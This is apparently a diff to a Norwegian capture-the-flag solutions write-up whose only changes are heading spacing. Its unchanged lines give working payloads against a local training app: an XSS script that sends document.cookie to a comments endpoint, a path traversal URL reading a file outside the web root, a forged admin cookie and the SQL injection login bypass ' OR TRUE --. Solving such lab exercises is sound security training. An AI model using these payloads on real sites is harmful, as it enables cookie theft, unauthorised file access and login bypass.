@@ -11,7 +11,7 @@ Denne oppgaven benytter XSS for å få "admin" til å sende en verdi som ligger 
 
 `<script> let  fd = new FormData(); fd.append('user', "asd"); fd.append('comment', JSON.stringify({"asd": document.cookie}));  fetch("http://localhost:8081/oppgave2/comments/create", {     method: 'POST',     body: fd, }); </script>`
 
-## Oppgave3:
+## Oppgave 3:
 I denne oppgaven utnytter vi path traversal til å hente en fil som egentlig ikke skal være tilgjengelig for brukeren. Vi benytter endepunktet for å laste ned instruksjons filen, men modifiserer filbanen til å gå opp i systemet, så til filen der flagget ligger.
 
 http://localhost:8081/oppgave3/download?file=../../../../windows/flag.txt
@@ -68,17 +68,17 @@ Her har vi ikke noen verifisering av rettigheter på serveren. Det gjør at hvis
 
 Cookie -> admin: 1
 
-## Oppgave7:
+## Oppgave 7:
 Dette er en tekst som er encodet i base64, man kan lett finne verktøy online, eller bruke f. eks base64 verktøyet fra GNU Coreutils
 
 `echo <tekst> | base64 -d`
 
-## Oppgave8:
+## Oppgave 8:
 Flagget i denne oppgaven er gjemt inne i bytes i bildet. Dette er en type kryptografi som heter steganography, som navnet på bildet hintet om. man kan finne verktøy online for å dekode dette.
 
 Steganography online decrypt (https://futureboy.us/stegano/decinput.html)
 
-## Oppgave9:
+## Oppgave 9:
 Denne oppgaven bruker SQL injection for å logge på serveren. Ved å lage en spørring som returnerer "true" blir man logget på uavhengig av om brukernavn og passord er riktig.
 
 `' OR TRUE --`
